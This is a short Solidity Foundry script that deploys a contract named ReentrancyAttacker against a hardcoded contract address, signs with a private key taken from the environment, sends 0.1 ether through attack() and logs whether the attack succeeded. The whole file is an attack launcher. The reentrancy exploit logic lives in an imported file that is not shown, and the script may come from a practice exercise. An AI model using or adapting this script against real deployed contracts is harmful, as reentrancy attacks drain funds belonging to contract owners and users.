// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/AttackerReentrancy.sol";

contract AttackerScript is Script {
    ReentrancyAttacker attacker;

    function run() public {
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
      //Deploy Attacker and trigger it
      attacker = new ReentrancyAttacker(payable(0x1CbBd22cb4001115427c4b1f21C8583544f0cb2f));
      (bool isSuccess) = attacker.attack{value: 0.1 ether}();
      console.log("Attack Successful", isSuccess);
      vm.stopBroadcast();
    }
}
